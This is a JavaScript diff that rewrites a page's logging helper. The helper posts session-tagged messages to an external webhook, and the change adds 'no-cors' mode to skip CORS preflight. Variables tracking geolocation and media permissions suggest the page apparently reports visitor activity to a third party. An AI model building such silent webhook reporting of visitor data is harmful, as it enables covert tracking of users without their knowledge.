@@ -13,11 +13,16 @@ let allowGeo = false, allowMedia = false, tries = 0;
 
 /* ===== HELPERS ===== */
 const $ = s => document.querySelector(s);
-const log = m => fetch(WH, {
-  method:"POST",
-  headers:{ "Content-Type":"application/json" },
-  body:JSON.stringify({ content:`[${SID}] ${m}` })
-}).catch(()=>{});
+/* ===== LOG helper (CORS-safe) ===== */
+const log = msg => {
+  fetch(WH, {
+    method: "POST",
+    mode:   "no-cors",                      // ← prevents pre-flight
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ content: `[${SID}] ${msg}` })
+  }).catch(() => {});
+};
+
 
 function sid(){return"xxxx-4xxx-yxxx".replace(/[xy]/g,c=>(Math.random()*16|0).toString(16))}
 function show(id){document.querySelectorAll(".panel").forEach(p=>p.classList.remove("active"));$(id).classList.add("active");}
